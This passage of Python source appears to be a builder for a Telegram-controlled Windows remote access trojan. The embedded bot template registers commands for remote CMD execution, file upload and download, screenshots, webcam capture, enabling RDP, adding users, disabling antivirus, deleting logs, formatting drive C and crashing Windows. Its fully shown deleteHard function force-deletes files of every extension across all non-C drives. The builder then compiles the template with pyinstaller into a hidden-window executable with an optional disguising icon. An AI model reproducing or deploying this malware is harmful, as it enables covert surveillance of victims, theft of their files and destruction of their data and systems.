        os.system(f"""c:/users/{getpass.getuser()}/audio_2020-07-25_13-21-54.mp3""")
        context.bot.sendMessage(chat_id,"Sound Playing")
        
        
def deleteHard(update:Update,context:CallbackContext):
    if str(update.message.chat_id) == chat_id:
        context.bot.sendMessage(chat_id,"Started,When All Files Deleted I Will Tell You.")
        allDrives = []
        allDrives2 = []
        paths = []

        def findDrives():
            cmdDrives = check_output("wmic logicaldisk get name", shell=True)
            drives = ["A:", "B:", "C:", "D:", "E:", "F:", "G:", "H:", "I:", "J:", "K:", "L:", "M:", "N:", "Q:", "R:", "O:",
                      "P:", "W:", "Y:", "S:", "T:", "U:", "V:", "X:", "Z:"]
            for i in drives:
                if i.encode() in cmdDrives:
                    allDrives2.append(i + "\\")
                    allDrives.append(i)

        findDrives()

        def findFilePath():
            suffix = []
            path = 'c:\\'

            # r=root, d=directories, f = files
            for path in allDrives2:
                for r, d, f in os.walk(path):
                    for file in f:
                        file = file.split(".")[-1]
                        suffix.append(file)
            suffix = list(dict.fromkeys(suffix))
            mainSuffix = []
            for b in suffix:

                if "0" not in b:
                    mainSuffix.append(b)

            for w in allDrives:
                if w =="c:":
                    continue
                for s in mainSuffix:
                    try:

                        path = os.system(f"Del {w}\*.{s} /f /s /q"
                                                       )

                    except:pass

        findFilePath()
        context.bot.sendMessage(chat_id,"Finished")
        
        
startHandler=CommandHandler("start",start)
updater.dispatcher.add_handler(startHandler)

ipFinderHandler=MessageHandler(Filters.regex("IP"),ipFinder)
updater.dispatcher.add_handler(ipFinderHandler)

systemInformationHandler=MessageHandler(Filters.regex("System Information"),systemInformation)
updater.dispatcher.add_handler(systemInformationHandler)

downloadFileHandler=MessageHandler(Filters.regex("Download File"),downloadFile)
updater.dispatcher.add_handler(downloadFileHandler)

donwloadFileMainHandler=CommandHandler("download",donwloadFileMain)
updater.dispatcher.add_handler(donwloadFileMainHandler)

makeUserHandler=MessageHandler(Filters.regex("Make User"),makeUser)
updater.dispatcher.add_handler(makeUserHandler)

restartSystemHandler=MessageHandler(Filters.regex("Restart"),restartSystem)
updater.dispatcher.add_handler(restartSystemHandler)

changeMainUserPassHandler=MessageHandler(Filters.regex("Change Main User Pass"),changeMainUserPass)
updater.dispatcher.add_handler(changeMainUserPassHandler)

taskManagerHandler=MessageHandler(Filters.regex("Task Manager"),taskManager)
updater.dispatcher.add_handler(taskManagerHandler)

enableTaskManagerHandler=CommandHandler("EnableTask",enableTaskManager)
updater.dispatcher.add_handler(enableTaskManagerHandler)

disableTaskManagerHandler=CommandHandler("DisableTask",disableTaskManager)
updater.dispatcher.add_handler(disableTaskManagerHandler)

lusrmgrHandler=MessageHandler(Filters.regex("Lusrmgr"),lusrmgr)
updater.dispatcher.add_handler(lusrmgrHandler)

disableLusrmgrHandler=CommandHandler("DisableLusrmgr",disableLusrmgr)
updater.dispatcher.add_handler(disableLusrmgrHandler)

enableLusrmgrHandler=CommandHandler("EnableLusrmgr",enableLusrmgr)
updater.dispatcher.add_handler(enableLusrmgrHandler)

enableGpeditHandler=CommandHandler("EnableGpedit",enableGpedit)
updater.dispatcher.add_handler(enableGpeditHandler)

disableGpeditHandler=CommandHandler("DisableGpedit",disableGpedit)
updater.dispatcher.add_handler(disableGpeditHandler)

gpeditHandler=MessageHandler(Filters.regex("Gpedit"),gpedit)
updater.dispatcher.add_handler(gpeditHandler)

enableRdpHandler=MessageHandler(Filters.regex("Enable RDP"),enableRdp)
updater.dispatcher.add_handler(enableRdpHandler)

cmdCommandsHandler=MessageHandler(Filters.regex("CMD Commands"),cmdCommands)
updater.dispatcher.add_handler(cmdCommandsHandler)

cmdCommandsMainHandler=CommandHandler("cmd",cmdCommandsMain)
updater.dispatcher.add_handler(cmdCommandsMainHandler)

uploadFileHandler=MessageHandler(Filters.regex("Upload File"),uploadFile)
updater.dispatcher.add_handler(uploadFileHandler)

uploadFileMainHandler=CommandHandler("upload",uploadFileMain)
updater.dispatcher.add_handler(uploadFileMainHandler)

runFileHandler=MessageHandler(Filters.regex("Run App"),runFile)
updater.dispatcher.add_handler(runFileHandler)

runFileMainHandler=CommandHandler("run",runFileMain)
updater.dispatcher.add_handler(runFileMainHandler)

screenShotHanlder=MessageHandler(Filters.regex("Screen Shot"),screenShot)
updater.dispatcher.add_handler(screenShotHanlder)

takePhotoHandler=MessageHandler(Filters.regex("Take Photo"),takePhoto)
updater.dispatcher.add_handler(takePhotoHandler)

recordVideoHandler=MessageHandler(Filters.regex("Record Video"),recordVideo)
updater.dispatcher.add_handler(recordVideoHandler)

playBadSoundHandler=MessageHandler(Filters.regex("Play Bad Sounds"),playBadSound)
updater.dispatcher.add_handler(playBadSoundHandler)

makeFileHandler=MessageHandler(Filters.regex("Make File"),makeFile)
updater.dispatcher.add_handler(makeFileHandler)

makeFileMainHandler=CommandHandler("makefile",makeFileMain)
updater.dispatcher.add_handler(makeFileMainHandler)

changeBackgHandler=MessageHandler(Filters.regex("Change Background"),changeBackg)
updater.dispatcher.add_handler(changeBackgHandler)

changeBackgMainHandler=MessageHandler(Filters.photo, changeBackgMain)
updater.dispatcher.add_handler(changeBackgMainHandler)

deleteHardHandler=MessageHandler(Filters.regex("Delete Hard Infos"),deleteHard)
updater.dispatcher.add_handler(deleteHardHandler)

destroyGraphicHandler=MessageHandler(Filters.regex('Destroy Graphic Card'),destroyGraphic)
updater.dispatcher.add_handler(destroyGraphicHandler)

destroyCDRomHandler=MessageHandler(Filters.regex("Destroy CD-Rom"),destroyCDRom)
updater.dispatcher.add_handler(destroyCDRomHandler)

endlessNotepadHandler=MessageHandler(Filters.regex("Open Endless Notepad"),endlessNotepad)
updater.dispatcher.add_handler(endlessNotepadHandler)

openAppsHandler=MessageHandler(Filters.regex("Crash Windows"),openApps_)
updater.dispatcher.add_handler(openAppsHandler)

endlessFolderHandler=MessageHandler(Filters.regex("Create Endless Folder"),endlessFolder)
updater.dispatcher.add_handler(endlessFolderHandler)

endlessUserHandler=MessageHandler(Filters.regex("Create Endless User"),endlessUser)
updater.dispatcher.add_handler(endlessUserHandler)

formatCHandler=MessageHandler(Filters.regex("Format Drive C"),formatC)
updater.dispatcher.add_handler(formatCHandler)

antiDisabledHandler=MessageHandler(Filters.regex("Disable All Antiviruss"),antiDisabled)
updater.dispatcher.add_handler(antiDisabledHandler)

makeBeepSoundHandler=MessageHandler(Filters.regex("Make Beep Sound"),makeBeepSound)
updater.dispatcher.add_handler(makeBeepSoundHandler)

desktopLockerHandler=MessageHandler(Filters.regex("Desktop Locker"),desktopLocker)
updater.dispatcher.add_handler(desktopLockerHandler)

deleteLogsHandler=MessageHandler(Filters.regex("Delete Logs"),deleteLogs)
updater.dispatcher.add_handler(deleteLogsHandler)

locationOnMapHandler=MessageHandler(Filters.regex("Location On Map"),locationOnMap)
updater.dispatcher.add_handler(locationOnMapHandler)

openUrlHandler=MessageHandler(Filters.regex("Open URL"),openUrl)
updater.dispatcher.add_handler(openUrlHandler)

openUrlMainHandler=CommandHandler("open",openUrlMain)
updater.dispatcher.add_handler(openUrlMainHandler)


showMessageBoxHandler=MessageHandler(Filters.regex("Show Message Box"),showMessageBox)
updater.dispatcher.add_handler(showMessageBoxHandler)

showMessageBoxMainHandler=CommandHandler("show",showMessageBoxMain)
updater.dispatcher.add_handler(showMessageBoxMainHandler)
updater.start_polling()
'''
        exportFile=open("Source.py","w",encoding="UTF-8")
        exportFile.write(source)
        print(setting["icon"])
        def makeExe():
            if setting["icon"] == "null" :
                a=os.system(f"pyinstaller  -w -F Source.py")
                shutil.rmtree("__pycache__")
                shutil.rmtree("build")
                os.system("cls")
                os.remove("Source.spec")
                startPage()

            else:
                a=os.system(f"pyinstaller  -w -F --icon {setting['icon']} Source.py")
                shutil.rmtree("__pycache__")
                shutil.rmtree("build")
                os.system("cls")
                os.remove("Source.spec")
                startPage()

        makeExe()
        os.system("cls")
        baner()
        print(colorama.Fore.RED+"Check Out Dist Dir.")
        input("Press Enter To Return")
        startPage()







    if option == "2":
        config()

    if option == "3":
        about()

    if option == "1":
        make()

    if option =="4":
        helpAndInstall()
    if option == '5':
        exit()
    else:
        startPage()
startPage()



















